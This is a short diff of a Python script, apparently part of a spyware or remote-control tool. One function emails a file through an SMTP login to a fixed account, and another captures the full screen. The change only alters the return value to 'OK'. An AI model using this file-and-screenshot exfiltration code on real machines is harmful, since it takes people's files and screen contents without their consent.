@@ -39,7 +39,7 @@ def Get(file1):#获取文件
     smtp.login(name,password)
     smtp.sendmail(name,name,msg.as_string())
     smtp.close()
-    return name+" "+file1
+    return "OK"
 def Win():#获取屏幕截图
     windown = Tk()
     jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
